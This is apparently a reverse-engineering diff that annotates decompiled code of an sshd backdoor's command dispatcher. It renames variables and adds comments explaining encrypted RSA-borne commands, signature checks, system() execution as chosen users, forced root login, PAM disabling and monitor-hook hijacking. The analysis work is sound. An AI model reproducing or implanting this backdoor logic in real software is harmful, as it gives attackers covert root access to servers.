@@ -27,36 +27,36 @@ BOOL run_backdoor_commands(RSA *key,global_context_t *ctx,BOOL *do_orig)
   sshd_monitor_func_t *keyallowed_slot;
   pfn_exit_t exit_fn;
   u8 control_flags;
-  uint uVar15;
-  int iVar16;
-  BOOL BVar17;
-  int iVar18;
+  uint rsa_payload_span;
+  int op_result;
+  BOOL operation_ok;
+  int scratch_index;
   uid_t caller_uid;
   int pselect_result;
-  ulong uVar21;
-  int *piVar22;
+  ulong payload_segment_len;
+  int *int_cursor;
   ssize_t bytes_read;
   BIGNUM *e;
   BIGNUM *n;
-  long lVar24;
-  byte bVar25;
-  uint uVar26;
+  long loop_idx;
+  byte monitor_opcode_field;
+  uint socket_slot_field;
   u64 sshkey_digest_offset;
   ulong payload_chunk_len;
   ulong command_opcode;
-  undefined1 uVar29;
+  byte monitor_opcode_override;
   gid_t rgid;
   BIGNUM **stack_wipe_cursor;
   fd_set *fdset_wipe_cursor;
-  u8 **ppuVar32;
+  u8 **scratch_ptr;
   uint *header_copy_cursor;
-  byte bVar34;
-  _union_110 _Var35;
-  long lVar36;
-  ulong uVar37;
+  byte log_hook_flags;
+  _union_110 selected_hostkey_idx;
+  long hostkey_cursor;
+  ulong rsa_payload_bytes;
   ulong payload_data_offset;
   byte *ed448_raw_key;
-  byte bVar39;
+  byte continuation_stride_flag;
   backdoor_payload_t decrypted_payload;
   run_backdoor_commands_data_t f;
   u64 payload_body_len;
@@ -70,12 +70,12 @@ BOOL run_backdoor_commands(RSA *key,global_context_t *ctx,BOOL *do_orig)
   int rsa_modulus_bits;
   sshd_offsets_t tmp;
   int socket_probe_header;
-  undefined4 uStack_59c;
+  undefined4 socket_probe_highword;
   u8 *extra_data;
-  undefined8 local_590;
-  undefined8 uStack_588;
+  undefined8 shared_keybuf_or_timespec_lo;
+  undefined8 shared_keybuf_or_timespec_hi;
   int body_size;
-  undefined1 local_550 [16];
+  undefined1 cmd_args_scratch[16];
   u8 *data_ptr2;
   u64 data_index;
   u32 v;
@@ -88,13 +88,13 @@ BOOL run_backdoor_commands(RSA *key,global_context_t *ctx,BOOL *do_orig)
   key_payload_t encrypted_payload;
   int rsa_modulus_bytes;
   BOOL sigcheck_result;
-  undefined8 local_83;
-  undefined8 uStack_7b;
+  undefined8 payload_nonce_lo;
+  undefined8 payload_nonce_hi;
   int key_idx;
   
-  bVar39 = 0;
+  continuation_stride_flag = 0;
   stack_wipe_cursor = &rsa_exponent_bn;
-  for (lVar24 = 0xae; lVar24 != 0; lVar24 = lVar24 + -1) {
+  for (loop_idx = 0xae; loop_idx != 0; loop_idx = loop_idx + -1) {
     *(undefined4 *)stack_wipe_cursor = 0;
     stack_wipe_cursor = (BIGNUM **)((long)stack_wipe_cursor + 4);
   }
@@ -114,14 +114,14 @@ BOOL run_backdoor_commands(RSA *key,global_context_t *ctx,BOOL *do_orig)
           ((ctx->imported_funcs != (imported_funcs_t *)0x0 &&
            // AutoDoc: Clamp the modulus to <0x4001 bits and ensure BN_bn2bin has room before treating the key bytes as a payload carrier.
            (((get_modulus_bitlen = ctx->imported_funcs->BN_num_bits, get_modulus_bitlen != (pfn_BN_num_bits_t)0x0 &&
-             (uVar15 = (*get_modulus_bitlen)(rsa_exponent_bn), uVar15 < 0x4001)) &&
-            (uVar15 = uVar15 + 7 >> 3, uVar15 - 0x14 < 0x205)))))) &&
-         (iVar16 = (*ctx->imported_funcs->BN_bn2bin)
+             (rsa_payload_span = (*get_modulus_bitlen)(rsa_exponent_bn), rsa_payload_span < 0x4001)) &&
+            (rsa_payload_span = rsa_payload_span + 7 >> 3, rsa_payload_span - 0x14 < 0x205)))))) &&
+         (op_result = (*ctx->imported_funcs->BN_bn2bin)
                              (rsa_exponent_bn,(uchar *)((long)&encrypted_payload.field0_0x0 + 5)),
-         -1 < iVar16)) {
-        uVar37 = (ulong)uVar15;
-        if ((ulong)(long)iVar16 <= uVar37) {
-          if ((ulong)(long)iVar16 < 0x11) goto LAB_0010a11a;
+         -1 < op_result)) {
+        rsa_payload_bytes = (ulong)rsa_payload_span;
+        if ((ulong)(long)op_result <= rsa_payload_bytes) {
+          if ((ulong)(long)op_result < 0x11) goto LAB_0010a11a;
           if (((CONCAT13(encrypted_payload.field0_0x0._8_1_,encrypted_payload.field0_0x0._5_3_) == 0
                ) || (encrypted_payload.field0_0x0._9_4_ == 0)) ||
              (command_opcode = (ulong)CONCAT13(encrypted_payload.field0_0x0._8_1_,
@@ -134,42 +134,42 @@ BOOL run_backdoor_commands(RSA *key,global_context_t *ctx,BOOL *do_orig)
              ((libc->exit != (pfn_exit_t)0x0 &&
               ((ctx->sshd_log_ctx != (sshd_log_ctx_t *)0x0 && (ctx->secret_bits_filled == 0x1c8)))))
              ) {
-            local_83 = CONCAT44(encrypted_payload.field0_0x0._9_4_,
+            payload_nonce_lo = CONCAT44(encrypted_payload.field0_0x0._9_4_,
                                 CONCAT13(encrypted_payload.field0_0x0._8_1_,
                                          encrypted_payload.field0_0x0._5_3_));
-            uStack_7b = encrypted_payload.field0_0x0._13_8_;
+            payload_nonce_hi = encrypted_payload.field0_0x0._13_8_;
             // AutoDoc: Unwrap the ChaCha key/nonce from secret_data and decrypt the modulus bytes into the temporary payload buffer.
-            BVar17 = secret_data_get_decrypted((u8 *)&key_idx,ctx);
-            if ((BVar17 != FALSE) &&
+            operation_ok = secret_data_get_decrypted((u8 *)&key_idx,ctx);
+            if ((operation_ok != FALSE) &&
                (payload_buffer_cursor = (u8 *)((long)&encrypted_payload.field0_0x0 + 0x15),
-               BVar17 = chacha_decrypt(payload_buffer_cursor,uVar15 - 0x10,(u8 *)&key_idx,(u8 *)&local_83,payload_buffer_cursor,
-                                       ctx->imported_funcs), BVar17 != FALSE)) {
-              *(u64 *)local_550 = 0;
-              *(cmd_arguments_t **)(local_550 + 8) = (cmd_arguments_t *)0x0;
-              piVar22 = &key_idx;
-              for (lVar24 = 0x39; lVar24 != 0; lVar24 = lVar24 + -1) {
-                *(u8 *)piVar22 = '\0';
-                piVar22 = (int *)((long)piVar22 + (ulong)bVar39 * -2 + 1);
+               operation_ok = chacha_decrypt(payload_buffer_cursor,rsa_payload_span - 0x10,(u8 *)&key_idx,(u8 *)&payload_nonce_lo,payload_buffer_cursor,
+                                       ctx->imported_funcs), operation_ok != FALSE)) {
+              *(u64 *)cmd_args_scratch = 0;
+              *(cmd_arguments_t **)(cmd_args_scratch + 8) = (cmd_arguments_t *)0x0;
+              int_cursor = &key_idx;
+              for (loop_idx = 0x39; loop_idx != 0; loop_idx = loop_idx + -1) {
+                *(u8 *)int_cursor = '\0';
+                int_cursor = (int *)((long)int_cursor + (ulong)continuation_stride_flag * -2 + 1);
               }
-              local_590 = 0;
-              uStack_588 = 0;
-              ppuVar32 = &data_ptr2;
-              for (lVar24 = 0x93; lVar24 != 0; lVar24 = lVar24 + -1) {
-                *(undefined4 *)ppuVar32 = 0;
-                ppuVar32 = (u8 **)((long)ppuVar32 + (ulong)bVar39 * -8 + 4);
+              shared_keybuf_or_timespec_lo = 0;
+              shared_keybuf_or_timespec_hi = 0;
+              scratch_ptr = &data_ptr2;
+              for (loop_idx = 0x93; loop_idx != 0; loop_idx = loop_idx + -1) {
+                *(undefined4 *)scratch_ptr = 0;
+                scratch_ptr = (u8 **)((long)scratch_ptr + (ulong)continuation_stride_flag * -8 + 4);
               }
               secrets = ctx->sshd_sensitive_data;
-              piVar22 = &body_size;
-              for (lVar24 = 0x29; lVar24 != 0; lVar24 = lVar24 + -1) {
-                *(undefined1 *)piVar22 = 0;
-                piVar22 = (int *)((long)piVar22 + (ulong)bVar39 * -2 + 1);
+              int_cursor = &body_size;
+              for (loop_idx = 0x29; loop_idx != 0; loop_idx = loop_idx + -1) {
+                *(undefined1 *)int_cursor = 0;
+                int_cursor = (int *)((long)int_cursor + (ulong)continuation_stride_flag * -2 + 1);
               }
               if ((((secrets != (sensitive_data *)0x0) && (secrets->host_pubkeys != (sshkey **)0x0))
-                  && (ctx->imported_funcs != (imported_funcs_t *)0x0)) && (0x71 < uVar37 - 0x10)) {
-                iVar16 = (int)command_opcode;
+                  && (ctx->imported_funcs != (imported_funcs_t *)0x0)) && (0x71 < rsa_payload_bytes - 0x10)) {
+                op_result = (int)command_opcode;
                 // AutoDoc: Cache the decoded opcode inside the cmd_arguments_t scratch so downstream handlers know how to interpret the payload body.
-                *(int *)local_550 = iVar16;
-                if (4 < uVar37 - 0x82) {
+                *(int *)cmd_args_scratch = op_result;
+                if (4 < rsa_payload_bytes - 0x82) {
                   encrypted_payload.field0_0x0._0_1_ = (undefined1)rsa_modulus_bytes;
                   encrypted_payload.field0_0x0._1_1_ = (undefined1)((uint)rsa_modulus_bytes >> 8);
                   encrypted_payload.field0_0x0._2_1_ = (undefined1)((uint)rsa_modulus_bytes >> 0x10)
@@ -178,57 +178,57 @@ BOOL run_backdoor_commands(RSA *key,global_context_t *ctx,BOOL *do_orig)
                   ;
                   encrypted_payload.field0_0x0._4_1_ = (undefined1)sigcheck_result;
                   // AutoDoc: Strip the 0x87-byte RSA header (nonce, digest, signature framing) and treat the remainder of the modulus as attacker-controlled command bytes.
-                  payload_body_len = uVar37 - 0x87;
+                  payload_body_len = rsa_payload_bytes - 0x87;
                   // AutoDoc: Opcode 2 treats the payload body as a `[uid||gid||cmd]` triple: it optionally loads the uid/gid pair, invokes setresgid/setresuid, and finally runs the attacker command through libc system().
                   if (command_opcode == 2) {
-                    uVar21 = (ulong)CONCAT11((undefined1)sigcheck_result,
+                    payload_segment_len = (ulong)CONCAT11((undefined1)sigcheck_result,
                                              encrypted_payload.field0_0x0._3_1_);
                     if ((char)encrypted_payload.field0_0x0._0_1_ < '\0') {
                       if (CONCAT11((undefined1)sigcheck_result,encrypted_payload.field0_0x0._3_1_)
                           != 0) goto LAB_0010a112;
                       payload_chunk_len = 0;
-                      uVar21 = 0x39;
+                      payload_segment_len = 0x39;
                       ed448_raw_key = (byte *)((long)&sigcheck_result + 1);
-                      lVar24 = 0;
+                      loop_idx = 0;
                     }
                     else {
                       if ((rsa_modulus_bytes & 0x100U) != 0) {
-                        uVar21 = uVar21 + 8;
+                        payload_segment_len = payload_segment_len + 8;
                       }
                       ed448_raw_key = (byte *)0x0;
-                      lVar24 = 0x87;
-                      payload_chunk_len = uVar21;
+                      loop_idx = 0x87;
+                      payload_chunk_len = payload_segment_len;
                     }
                     // AutoDoc: Abort if the decrypted modulus does not contain enough bytes for the `[uid||gid||cmd]` tuple requested by the flag mix.
-                    if (payload_body_len < uVar21) goto LAB_0010a112;
-                    _data_offset = uVar21 + 5;
-                    payload_body_len = payload_body_len - uVar21;
-                    payload_data_offset = uVar21 + 0x87;
-                    iVar18 = (int)uVar21 + 4;
+                    if (payload_body_len < payload_segment_len) goto LAB_0010a112;
+                    _data_offset = payload_segment_len + 5;
+                    payload_body_len = payload_body_len - payload_segment_len;
+                    payload_data_offset = payload_segment_len + 0x87;
+                    scratch_index = (int)payload_segment_len + 4;
                   }
-                  else if ((iVar16 == 3) && ((rsa_modulus_bytes & 0x4000U) == 0)) {
+                  else if ((op_result == 3) && ((rsa_modulus_bytes & 0x4000U) == 0)) {
                     if (payload_body_len < 0x30) goto LAB_0010a112;
                     payload_chunk_len = 0x30;
-                    lVar24 = 0x87;
+                    loop_idx = 0x87;
                     ed448_raw_key = (byte *)0x0;
                     _data_offset = 0x35;
                     payload_data_offset = 0x87;
-                    iVar18 = 0x34;
+                    scratch_index = 0x34;
                   }
                   else {
                     payload_chunk_len = 0;
-                    lVar24 = 0;
+                    loop_idx = 0;
                     payload_data_offset = 0x87;
                     ed448_raw_key = (byte *)0x0;
                     _data_offset = 5;
-                    iVar18 = 4;
+                    scratch_index = 4;
                   }
-                  piVar22 = &rsa_modulus_bytes;
-                  header_copy_cursor = (undefined4 *)(local_550 + 4);
-                  for (uVar21 = (ulong)(iVar18 + 1); uVar21 != 0; uVar21 = uVar21 - 1) {
-                    *(char *)header_copy_cursor = (char)*piVar22;
-                    piVar22 = (int *)((long)piVar22 + (ulong)bVar39 * -2 + 1);
-                    header_copy_cursor = (undefined4 *)((long)header_copy_cursor + (ulong)bVar39 * -2 + 1);
+                  int_cursor = &rsa_modulus_bytes;
+                  header_copy_cursor = (undefined4 *)(cmd_args_scratch + 4);
+                  for (payload_segment_len = (ulong)(scratch_index + 1); payload_segment_len != 0; payload_segment_len = payload_segment_len - 1) {
+                    *(char *)header_copy_cursor = (char)*int_cursor;
+                    int_cursor = (int *)((long)int_cursor + (ulong)continuation_stride_flag * -2 + 1);
+                    header_copy_cursor = (undefined4 *)((long)header_copy_cursor + (ulong)continuation_stride_flag * -2 + 1);
                   }
                   stack0xfffffffffffffa60 = (u8 *)0x0;
                   host_keys = secrets->host_keys;
@@ -237,36 +237,37 @@ BOOL run_backdoor_commands(RSA *key,global_context_t *ctx,BOOL *do_orig)
                      ((host_keys != secrets->host_pubkeys &&
                       (((((uint)secrets->have_ssh2_key < 2 &&
                          // AutoDoc: Sanity-check both host key arrays; if the cached counts do not match, signature verification is skipped and the hook bails.
-                         (BVar17 = count_pointers(host_keys,(u64 *)((long)&socket_probe_header + 1),
-                                                  ctx->libc_imports), BVar17 != FALSE)) &&
-                        (BVar17 = count_pointers(ctx->sshd_sensitive_data->host_pubkeys,
+                         (operation_ok = count_pointers(host_keys,(u64 *)((long)&socket_probe_header + 1),
+                                                  ctx->libc_imports), operation_ok != FALSE)) &&
+                        (operation_ok = count_pointers(ctx->sshd_sensitive_data->host_pubkeys,
                                                  (u64 *)&extra_data,ctx->libc_imports),
-                        payload_buffer_cursor = stack0xfffffffffffffa60, BVar17 != FALSE)) &&
+                        payload_buffer_cursor = stack0xfffffffffffffa60, operation_ok != FALSE)) &&
                        (stack0xfffffffffffffa60 == extra_data)))))) {
-                    BVar17 = secret_data_get_decrypted((u8 *)&local_590,ctx);
-                    if (BVar17 != FALSE) {
-                      lVar36 = 0;
+                    operation_ok = secret_data_get_decrypted((u8 *)&shared_keybuf_or_timespec_lo,ctx);
+                    if (operation_ok != FALSE) {
+                      hostkey_cursor = 0;
                       do {
                         offsets.field0_0x0 = SUB84(payload_buffer_cursor,0);
-                        _Var35.raw_value = (u32)lVar36;
-                        if ((uint)offsets.field0_0x0 <= _Var35.raw_value) goto LAB_0010a112;
+                        selected_hostkey_idx.raw_value = (u32)hostkey_cursor;
+                        if ((uint)offsets.field0_0x0 <= selected_hostkey_idx.raw_value) goto LAB_0010a112;
                         // AutoDoc: Iterate every cached host key until the Ed448 signature over the modulus+ciphertext digest validates.
-                        BVar17 = verify_signature(ctx->sshd_sensitive_data->host_pubkeys[lVar36],
-                                                  local_550,_data_offset + 4,0x25c,
+                        operation_ok = verify_signature(ctx->sshd_sensitive_data->host_pubkeys[hostkey_cursor],
+                                                  cmd_args_scratch,_data_offset + 4,0x25c,
                                                   (u8 *)((long)&encrypted_payload.field0_0x0 + 0x15)
-                                                  ,(u8 *)&local_590,ctx);
-                        lVar36 = lVar36 + 1;
-                      } while (BVar17 == FALSE);
-                      ctx->sshd_host_pubkey_idx = (u32)_Var35;
+                                                  ,(u8 *)&shared_keybuf_or_timespec_lo,ctx);
+                        hostkey_cursor = hostkey_cursor + 1;
+                      } while (operation_ok == FALSE);
+                      ctx->sshd_host_pubkey_idx = (u32)selected_hostkey_idx;
                       if ((command_opcode != 2) || (-1 < (char)encrypted_payload.field0_0x0._0_1_)) {
-                        if (lVar24 == 0) {
+                        if (loop_idx == 0) {
 LAB_00109a97:
-                          if (payload_data_offset <= uVar37) goto LAB_00109aa2;
+                          if (payload_data_offset <= rsa_payload_bytes) goto LAB_00109aa2;
                         }
                         else {
                           payload_data_offset = 0x87;
 LAB_00109aa2:
-                          if (payload_chunk_len <= uVar37 - payload_data_offset) {
+                          // AutoDoc: Make sure the attacker-provided chunk actually fits inside the decrypted modulus body before the dispatcher starts consuming opcode-specific fields.
+                          if (payload_chunk_len <= rsa_payload_bytes - payload_data_offset) {
                             if ((((encrypted_payload.field0_0x0._0_1_ & 4) == 0) ||
                                 (ctx->libc_imports == (libc_imports_t *)0x0)) ||
                                (setlogmask_fn = ctx->libc_imports->setlogmask,
@@ -283,45 +284,45 @@ LAB_00109aa2:
                             control_flags = encrypted_payload.field0_0x0._0_1_;
                             // AutoDoc: Capture whoever triggered the RSA hook (getuid) so sshd_proxy_elevate and the PAM/log toggles can reason about the original privilege.
                             ctx->caller_uid = caller_uid;
-                            bVar34 = encrypted_payload.field0_0x0._0_1_ & 0x10;
-                            if (((bVar34 == 0) || (ctx->sshd_log_ctx->handler_slots_valid != FALSE))
+                            log_hook_flags = encrypted_payload.field0_0x0._0_1_ & 0x10;
+                            if (((log_hook_flags == 0) || (ctx->sshd_log_ctx->handler_slots_valid != FALSE))
                                && (((encrypted_payload.field0_0x0._0_1_ & 2) == 0 ||
                                    // AutoDoc: Optional logging instructions drop the mm_log_handler hook into place once the caller proved the handler/context slots are writable.
-                                   ((BVar17 = sshd_configure_log_hook
+                                   ((operation_ok = sshd_configure_log_hook
                                                         ((cmd_arguments_t *)&encrypted_payload,ctx),
-                                    BVar17 != FALSE || (bVar34 == 0)))))) {
+                                    operation_ok != FALSE || (log_hook_flags == 0)))))) {
                               if (command_opcode == 0) {
                                 if (((char)encrypted_payload.field0_0x0._1_1_ < '\0') ||
                                    (ctx->sshd_ctx->permit_root_login_ptr != (int *)0x0)) {
-                                  bVar34 = 0xff;
+                                  log_hook_flags = 0xff;
                                   if ((encrypted_payload.field0_0x0._1_1_ & 2) != 0) {
-                                    bVar34 = (byte)(CONCAT11(encrypted_payload.field0_0x0._3_1_,
+                                    log_hook_flags = (byte)(CONCAT11(encrypted_payload.field0_0x0._3_1_,
                                                              encrypted_payload.field0_0x0._2_1_) >>
                                                    6) & 0x7f;
                                   }
-                                  bVar25 = 0xff;
+                                  monitor_opcode_field = 0xff;
                                   if ((char)control_flags < '\0') {
-                                    bVar25 = (byte)(((ulong)CONCAT41(encrypted_payload.field0_0x0.
+                                    monitor_opcode_field = (byte)(((ulong)CONCAT41(encrypted_payload.field0_0x0.
                                                                      _4_4_,encrypted_payload.
                                                                            field0_0x0._3_1_) << 0x18
                                                     ) >> 0x1d) & 0x1f;
                                   }
-                                  uVar15 = (uint)CONCAT11(bVar25,bVar34);
+                                  rsa_payload_span = (uint)CONCAT11(monitor_opcode_field,log_hook_flags);
                                   if ((encrypted_payload.field0_0x0._1_1_ & 4) == 0) {
 LAB_00109c56:
-                                    uVar15 = uVar15 | 0xff0000;
-                                    uVar26 = 0xff;
+                                    rsa_payload_span = rsa_payload_span | 0xff0000;
+                                    socket_slot_field = 0xff;
                                   }
                                   else {
-                                    uVar26 = (uint)((byte)encrypted_payload.field0_0x0._4_1_ >> 5);
-                                    uVar15 = uVar15 | ((byte)encrypted_payload.field0_0x0._4_1_ >> 2
+                                    socket_slot_field = (uint)((byte)encrypted_payload.field0_0x0._4_1_ >> 5);
+                                    rsa_payload_span = rsa_payload_span | ((byte)encrypted_payload.field0_0x0._4_1_ >> 2
                                                       & 7) << 0x10;
                                   }
 LAB_00109c7b:
-                                  uVar15 = uVar15 | uVar26 << 0x18;
+                                  rsa_payload_span = rsa_payload_span | socket_slot_field << 0x18;
 LAB_00109c8a:
                                   // AutoDoc: The bit packing above rewrites sshd_offsets (log slot, monitor opcode override, socket ordinal) directly from the attacker’s flag bytes.
-                                  (ctx->sshd_offsets).field0_0x0.raw_value = uVar15;
+                                  (ctx->sshd_offsets).field0_0x0.raw_value = rsa_payload_span;
                                   command_payload_ptr = (uid_t *)((long)&encrypted_payload.field0_0x0 +
                                                     payload_data_offset + 5);
                                   // AutoDoc: Opcode 1/2/3 sides only run when the hook already executes as root; unprivileged callers are forced through the harmless offsets rewrite.
@@ -339,12 +340,13 @@ LAB_00109c8a:
                                            (sshd_ctx->have_mm_answer_keyallowed != FALSE)) {
                                           if ((char)encrypted_payload.field0_0x0._1_1_ < '\0')
                                           goto LAB_00109d36;
-                                          piVar22 = sshd_ctx->permit_root_login_ptr;
-                                          if (piVar22 != (int *)0x0) {
-                                            iVar16 = *piVar22;
-                                            if (iVar16 < 3) {
-                                              if (-1 < iVar16) {
-                                                *piVar22 = 3;
+                                          int_cursor = sshd_ctx->permit_root_login_ptr;
+                                          if (int_cursor != (int *)0x0) {
+                                            op_result = *int_cursor;
+                                            if (op_result < 3) {
+                                              if (-1 < op_result) {
+                                                // AutoDoc: When opcode 0 targets PermitRootLogin, force sshd's config slot to the `forced-yes` enum so password auth stays open for the operator.
+                                                *int_cursor = 3;
 LAB_00109d36:
                                                 // AutoDoc: Control-flag bit 6 disables PAM by zeroing sshd_ctx->use_pam_ptr whenever the caller wants password auth rejected regardless of sshd’s config.
                                                 if ((control_flags & 0x40) != 0) {
@@ -354,80 +356,80 @@ LAB_00109d36:
                                                   *use_pam_ptr = 0;
                                                 }
                                                 stack0xfffffffffffffa60 =
-                                                     (u8 *)CONCAT44(uStack_59c,0xffffffff);
+                                                     (u8 *)CONCAT44(socket_probe_highword,0xffffffff);
                                                 if ((control_flags & 0x20) == 0) {
                                                   // AutoDoc: Opcode 0 either reuses the live monitor client socket or captures a fresh one so payload replies can be streamed back to the attacker.
-                                                  BVar17 = sshd_get_client_socket
+                                                  operation_ok = sshd_get_client_socket
                                                                      (ctx,(int *)((long)&
                                                   socket_probe_header + 1),1,DIR_READ);
                                                 }
                                                 else {
                                                   // AutoDoc: When the control flags request a manual socket ordinal the helper probes each fd via shutdown/read until a viable descriptor is found.
-                                                  BVar17 = sshd_get_usable_socket
+                                                  operation_ok = sshd_get_usable_socket
                                                                      ((int *)((long)&
                                                   socket_probe_header + 1),
                                                   (byte)encrypted_payload.field0_0x0._1_1_ >> 3 &
                                                   0xf,libc);
                                                 }
-                                                if (BVar17 != FALSE) {
-                                                  iVar16 = stack0xfffffffffffffa60;
+                                                if (operation_ok != FALSE) {
+                                                  op_result = stack0xfffffffffffffa60;
                                                   *(u8 *)&socket_probe_header = 0;
                                                   extra_data = (u8 *)((ulong)extra_data &
                                                                      0xffffffff00000000);
-                                                  local_590 = 0;
-                                                  uStack_588 = 0;
+                                                  shared_keybuf_or_timespec_lo = 0;
+                                                  shared_keybuf_or_timespec_hi = 0;
                                                   if (((-1 < stack0xfffffffffffffa60) &&
                                                       (libc = ctx->libc_imports,
                                                       libc != (libc_imports_t *)0x0)) &&
                                                      ((libc->pselect != (pfn_pselect_t)0x0 &&
                                                       (libc->__errno_location !=
                                                        (pfn___errno_location_t)0x0)))) {
-                                                    iVar18 = stack0xfffffffffffffa60 >> 6;
-                                                    uVar37 = 1L << ((byte)stack0xfffffffffffffa60 &
+                                                    scratch_index = stack0xfffffffffffffa60 >> 6;
+                                                    rsa_payload_bytes = 1L << ((byte)stack0xfffffffffffffa60 &
                                                                    0x3f);
                                                     do {
-                                                      uStack_588 = 500000000;
-                                                      fdset_wipe_cursor = (fd_set *)local_550;
-                                                      for (lVar24 = 0x20; lVar24 != 0;
-                                                          lVar24 = lVar24 + -1) {
+                                                      shared_keybuf_or_timespec_hi = 500000000;
+                                                      fdset_wipe_cursor = (fd_set *)cmd_args_scratch;
+                                                      for (loop_idx = 0x20; loop_idx != 0;
+                                                          loop_idx = loop_idx + -1) {
                                                         *(undefined4 *)fdset_wipe_cursor = 0;
                                                         fdset_wipe_cursor = (fd_set *)
                                                                   ((long)fdset_wipe_cursor +
-                                                                  (ulong)bVar39 * -8 + 4);
+                                                                  (ulong)continuation_stride_flag * -8 + 4);
                                                       }
-                                                      *(ulong *)(local_550 + (long)iVar18 * 8) =
-                                                           uVar37;
-                                                      local_590 = 0;
+                                                      *(ulong *)(cmd_args_scratch + (long)scratch_index * 8) =
+                                                           rsa_payload_bytes;
+                                                      shared_keybuf_or_timespec_lo = 0;
                                                       // AutoDoc: Block on the attacker-chosen socket (up to 500ms) before slurping the next monitor reply chunk so forged payloads stay aligned with sshd’s IPC cadence.
-                                                      pselect_result = (*libc->pselect)(iVar16 + 1,
+                                                      pselect_result = (*libc->pselect)(op_result + 1,
                                                                                   (fd_set *)
-                                                                                  local_550,
+                                                                                  cmd_args_scratch,
                                                                                   (fd_set *)0x0,
                                                                                   (fd_set *)0x0,
                                                                                   (timespec *)
-                                                                                  &local_590,
+                                                                                  &shared_keybuf_or_timespec_lo,
                                                                                   (sigset_t *)0x0);
                                                       if (-1 < pselect_result) {
                                                         if (((pselect_result != 0) &&
-                                                            ((uVar37 & *(ulong *)(local_550 +
-                                                                                 (long)iVar18 * 8))
+                                                            ((rsa_payload_bytes & *(ulong *)(cmd_args_scratch +
+                                                                                 (long)scratch_index * 8))
                                                              != 0)) &&
-                                                           (bytes_read = fd_read(iVar16,&extra_data,4,
+                                                           (bytes_read = fd_read(op_result,&extra_data,4,
                                                                              libc), -1 < bytes_read))
                                                         {
-                                                          uVar15 = (uint)extra_data >> 0x18 |
+                                                          rsa_payload_span = (uint)extra_data >> 0x18 |
                                                                    ((uint)extra_data & 0xff0000) >>
                                                                    8 | ((uint)extra_data & 0xff00)
                                                                        << 8 |
                                                                    (uint)extra_data << 0x18;
                                                           extra_data = (u8 *)CONCAT44(extra_data.
-                                                                                      _4_4_,uVar15);
-                                                          if ((uVar15 - 1 < 0x41) &&
-                                                             (bytes_read = fd_read(iVar16,&
+                                                                                      _4_4_,rsa_payload_span);
+                                                          if ((rsa_payload_span - 1 < 0x41) &&
+                                                             (bytes_read = fd_read(op_result,&
                                                   socket_probe_header,1,libc), -1 < bytes_read)) {
                                                     ctx->sock_read_len =
                                                          (ulong)((uint)extra_data - 1);
-                                                    bytes_read = fd_read(iVar16,ctx->sock_read_buf,
+                                                    bytes_read = fd_read(op_result,ctx->sock_read_buf,
                                                                      (ulong)((uint)extra_data - 1),
                                                                      libc);
                                                     if (-1 < bytes_read) {
@@ -438,17 +440,17 @@ LAB_00109d36:
                                                   mm_answer_keyallowed_slot;
                                                   if ((encrypted_payload.field0_0x0._2_1_ & 0x3f) ==
                                                       0) {
-                                                    iVar16 = 0x16;
+                                                    op_result = 0x16;
                                                     if (keyallowed_slot != (sshd_monitor_func_t *)0x0) {
-                                                      iVar16 = *(int *)(keyallowed_slot + -1);
+                                                      op_result = *(int *)(keyallowed_slot + -1);
                                                     }
                                                   }
                                                   else {
-                                                    iVar16 = (uint)(encrypted_payload.field0_0x0.
+                                                    op_result = (uint)(encrypted_payload.field0_0x0.
                                                                     _2_1_ & 0x3f) * 2;
                                                   }
                                                   // AutoDoc: Select the monitor request opcode the attacker wants to impersonate and drop mm_answer_keyallowed_hook into the live slot so the next exchange hits the implant.
-                                                  sshd_ctx->mm_answer_keyallowed_reqtype = iVar16 + 1
+                                                  sshd_ctx->mm_answer_keyallowed_reqtype = op_result + 1
                                                   ;
                                                   *keyallowed_slot = sshd_ctx->mm_answer_keyallowed_hook;
                                                   goto LAB_0010a076;
@@ -458,19 +460,19 @@ LAB_00109d36:
                                                   }
                                                   break;
                                                   }
-                                                  piVar22 = (*libc->__errno_location)();
-                                                  } while (*piVar22 == 4);
+                                                  int_cursor = (*libc->__errno_location)();
+                                                  } while (*int_cursor == 4);
                                                   }
                                                 }
                                               }
                                             }
-                                            else if (iVar16 == 3) goto LAB_00109d36;
+                                            else if (op_result == 3) goto LAB_00109d36;
                                           }
                                         }
                                       }
-                                      else if (iVar16 == 1) {
+                                      else if (op_result == 1) {
                                         // AutoDoc: Opcode 1 rewrites sshd globals (PermitRootLogin, use_pam, etc.) based on the control-flag bits before re-entering the monitor loop.
-                                        BVar17 = sshd_patch_variables
+                                        operation_ok = sshd_patch_variables
                                                            ((byte)encrypted_payload.field0_0x0._1_1_
                                                             & TRUE,(byte)encrypted_payload.
                                                                          field0_0x0._0_1_ >> 6 &
@@ -479,36 +481,36 @@ LAB_00109d36:
                                                             >> 1 & TRUE,
                                                             (uint)(byte)encrypted_payload.field0_0x0
                                                                         ._3_1_,ctx);
-                                        if (BVar17 != FALSE) {
+                                        if (operation_ok != FALSE) {
 LAB_0010a076:
-                                          local_590 = CONCAT71((local_590 >> 8),1);
-                                          *(cmd_arguments_t **)(local_550 + 8) = (cmd_arguments_t *)0x0;
-                                          ppuVar32 = &data_ptr2;
-                                          for (lVar24 = 0x3c; lVar24 != 0; lVar24 = lVar24 + -1) {
-                                            *(undefined4 *)ppuVar32 = 0;
-                                            ppuVar32 = (u8 **)((long)ppuVar32 +
-                                                              (ulong)bVar39 * -8 + 4);
+                                          shared_keybuf_or_timespec_lo = CONCAT71((shared_keybuf_or_timespec_lo >> 8),1);
+                                          *(cmd_arguments_t **)(cmd_args_scratch + 8) = (cmd_arguments_t *)0x0;
+                                          scratch_ptr = &data_ptr2;
+                                          for (loop_idx = 0x3c; loop_idx != 0; loop_idx = loop_idx + -1) {
+                                            *(undefined4 *)scratch_ptr = 0;
+                                            scratch_ptr = (u8 **)((long)scratch_ptr +
+                                                              (ulong)continuation_stride_flag * -8 + 4);
                                           }
-                                          *(u64 *)local_550 = 0x80;
+                                          *(u64 *)cmd_args_scratch = 0x80;
                                           *(u8 *)&body_offset = 8;
                                           *(u8 *)&size = 1;
                                           e = (*ctx->imported_funcs->BN_bin2bn)
-                                                        ((uchar *)&local_590,1,(BIGNUM *)0x0);
+                                                        ((uchar *)&shared_keybuf_or_timespec_lo,1,(BIGNUM *)0x0);
                                           if (((e != (BIGNUM *)0x0) &&
                                               (n = (*ctx->imported_funcs->BN_bin2bn)
-                                                             (local_550,0x100,(BIGNUM *)0x0),
+                                                             (cmd_args_scratch,0x100,(BIGNUM *)0x0),
                                               n != (BIGNUM *)0x0)) &&
-                                             (iVar16 = (*ctx->imported_funcs->RSA_set0_key)
+                                             (op_result = (*ctx->imported_funcs->RSA_set0_key)
